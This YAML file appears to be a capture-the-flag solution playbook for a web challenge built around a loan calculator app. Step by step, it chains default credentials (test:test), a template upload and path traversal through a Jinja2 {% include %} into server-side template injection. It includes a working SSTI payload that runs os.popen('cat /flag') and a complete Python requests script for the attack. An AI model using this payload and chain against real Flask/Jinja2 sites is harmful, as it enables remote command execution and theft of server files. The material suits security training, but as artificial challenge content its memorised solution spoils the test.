name: ssti_include_path_traversal_loan_calculator
category: web
tags: [ssti, jinja2, path_traversal, file_upload, default_credentials]
indicators:
  - "Jinja2 template uses {% include %} for dynamic inclusion"
  - "File upload functionality"
  - "Default credentials exist"
  - "Path check can be bypassed"

tricks:
  - name: "Step 1: Identify default credentials"
    when: "Analyze source code"
    how: "Default account test:test exists"
    payload: |
      username='test', password='test'

  - name: "Step 2: Analyze SSTI vulnerability"
    when: "Check error.html template"
    how: "Template uses {% include error_type %} for dynamic file inclusion"
    payload: |
      {% include error_type %}

  - name: "Step 3: Analyze path restrictions"
    when: "Test error_type parameter"
    how: "error_type gets templates/ prefix, but ../ can escape"
    payload: |
      error_type = 'templates/' + user_input
      # Can use ../ to escape templates directory

  - name: "Step 4: Upload malicious template"
    when: "Need to upload SSTI payload"
    how: "Upload file to /static/images/ via profile update"
    payload: |
      ssti_payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}"
      files = {'image_profile': ('exploit.html', ssti_payload, 'text/html')}
      requests.post('http://TARGET/update_profile', files=files, data={...})

  - name: "Step 5: Trigger SSTI via path traversal"
    when: "Malicious template uploaded"
    how: "Use ../ to escape templates directory and include uploaded file"
    payload: |
      /error?error_type=../images/exploit.html

  - name: "Step 6: Extract the flag"
    when: "Execute attack"
    how: "Login -> Upload malicious template -> Path traversal to trigger SSTI"
    payload: |
      s = requests.Session()
      s.post('http://TARGET/login', data={'username': 'test', 'password': 'test'})
      payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}"
      files = {'image_profile': ('exploit.html', payload, 'text/html')}
      s.post('http://TARGET/update_profile', files=files, data={...})
      resp = s.get('http://TARGET/error', params={'error_type': '../images/exploit.html'})
